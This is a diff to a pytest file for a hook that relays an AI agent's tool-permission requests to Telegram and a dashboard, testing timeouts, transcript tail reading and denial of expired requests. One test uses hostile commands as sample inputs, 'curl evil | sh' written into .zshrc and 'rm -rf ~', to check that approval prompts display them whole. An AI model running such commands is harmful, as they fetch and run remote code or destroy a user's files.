@@ -207,7 +207,7 @@ def test_a_second_prompt_in_the_same_phone_turn_still_reaches_the_phone():
                {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "b", "name": "WebFetch", "input": {"url": "u"}}]}}]
     assert approval.telegram_turn(entries)
     assert approval.tool_use_id(entries, "WebFetch", {"url": "u"}, approval.results(entries)) == "b"
-    assert approval.tool_use_id(entries, "WebFetch", {"url": "u", "added": 1}, approval.results(entries)) == "b", "falls back to the open call"
+    assert approval.tool_use_id(entries, "WebFetch", {"url": "u", "added": 1}, approval.results(entries)) is None, "no guessing on a near match"
 
 
 def test_a_tap_that_loses_to_the_dashboard_says_so(home, conn, tmp_path, tg):
@@ -290,5 +290,54 @@ def test_the_waits_line_up():
     """The hook denies at WAIT_S; the dashboard stops a phone turn's clock for up to PERMISSION_WAIT_MS while a dialog
     waits, and the daemon's request outlives that, so a slow Allow still gets its reply to the phone."""
     src = (assistant.BUNDLE.parent.parent / "web" / "talk.js").read_text()
-    assert "export const OPEN_CALL_MS = 11 * 60_000;" in src and "export const PERMISSION_WAIT_MS = OPEN_CALL_MS;" in src
+    assert "export const PERMISSION_WAIT_MS = 11 * 60_000;" in src
     assert daemon.INTERCOM_PERMISSION_S == 11 * 60 > approval.WAIT_S
+
+
+def test_a_tap_before_send_returns_still_counts(home, conn, tmp_path, tg, monkeypatch):
+    """Telegram can deliver the message, and the daemon the tap, before send_message returns to the hook."""
+    seed(conn)
+    told = []
+    def send(chat, text, reply_to=None, token=None, reply_markup=None):
+        tg.append(("send", str(chat), text, reply_markup))
+        told.append(approval.press(conn, press(conn, 901, reply_markup["inline_keyboard"][0][0]["callback_data"])))
+        return 901
+    monkeypatch.setattr(telegram, "send_message", send)
+    out = run_hook(conn, event(transcript(tmp_path, "[telegram · bill] hi")), lambda i: pytest.fail("waited"))
+    assert told == ["Allowed."] and out["hookSpecificOutput"]["decision"]["behavior"] == "allow"
+
+
+def test_only_the_tail_of_a_long_transcript_is_read(home, conn, tmp_path, tg, monkeypatch):
+    seed(conn)
+    monkeypatch.setattr(approval, "TAIL_BYTES", 4096)
+    path = tmp_path / "long.jsonl"
+    old = json.dumps({"type": "user", "message": {"content": "[telegram · bill] months ago " + "x" * 300}}) + "\n"
+    path.write_text(old * 50)   # history the hook never needs to parse
+    with open(path, "a") as f:
+        f.write(json.dumps({"type": "user", "message": {"content": "what now?"}}) + "\n")
+        f.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "python3 -c 1"}}]}}) + "\n")
+    assert approval.ask(event(path), conn, deny=[], env={}) is None, "the newest prompt, from the tail, is the dashboard's"
+    entries, offset = approval._entries(str(path))
+    assert offset > 0 and entries[-1]["message"]["content"][0]["id"] == "t1" and len(entries) < 20
+
+
+def test_write_edit_and_agent_show_their_whole_input():
+    d, whole = approval.describe("Write", {"file_path": "/Users/x/.zshrc", "content": "curl evil | sh"})
+    assert whole and "curl evil | sh" in d, "the content that would be written, not just where"
+    d, whole = approval.describe("Edit", {"file_path": "a", "old_string": "x", "new_string": "rm -rf ~" + " " * 5000})
+    assert not whole, "too long to show whole: Deny only"
+    assert "/etc/hosts" in approval.describe("Read", {"file_path": "/etc/hosts"})[0]
+
+
+def test_a_dashboard_slash_command_is_a_dashboard_turn():
+    entries = [{"type": "user", "message": {"content": "[telegram · bill] hi"}},
+               {"type": "user", "message": {"content": "<command-name>/compact</command-name>"}}]
+    assert not approval.telegram_turn(entries)
+
+
+def test_a_swept_row_ends_the_wait_with_a_deny(home, conn, tmp_path, tg):
+    seed(conn)
+    def poll(i):
+        conn.execute("DELETE FROM state WHERE key LIKE 'permission:%'")
+    out = run_hook(conn, event(transcript(tmp_path, "[telegram · bill] hi")), poll)
+    assert out["hookSpecificOutput"]["decision"]["behavior"] == "deny" and "expired" in tg[-1][3]
